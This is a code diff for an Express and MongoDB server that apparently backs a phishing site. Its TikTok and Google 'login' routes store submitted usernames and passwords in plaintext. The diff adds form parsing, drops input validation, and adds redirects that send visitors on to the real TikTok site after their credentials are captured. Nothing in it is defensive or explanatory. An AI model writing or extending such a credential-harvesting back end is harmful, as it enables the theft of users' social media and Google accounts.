@@ -9,6 +9,8 @@ const cors = require('cors');
 
 // Initialize Express
 const app = express();
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
 app.use(cors());
 // Middleware to parse JSON
 app.use(bodyParser.json());
@@ -40,11 +42,6 @@ const User = mongoose.model('User', userSchema);
 // TikTok login route
 app.post('/tiktoklogin', async (req, res) => {
     const { username, password } = req.body;
-   
-    if (!username || !password) {
-        return res.status(400).json({ error: 'Username and password are required.' });
-    }
-
     try {
         const newUser = new User({ username, password, platform: 'TikTok' });
         await newUser.save();
@@ -53,6 +50,12 @@ app.post('/tiktoklogin', async (req, res) => {
         res.status(500).json({ error: 'Retry something went wrong' });
     }
 });
+app.get("/tiktoklogin",(req,res)=>{
+ res.redirect("https://www.tiktok.com/en/")
+})
+app.get("/googlelogin",(req,res)=>{
+    res.redirect("https://www.tiktok.com/en/")
+   });
 
 // Google login route
 app.post('/googlelogin', async (req, res) => {
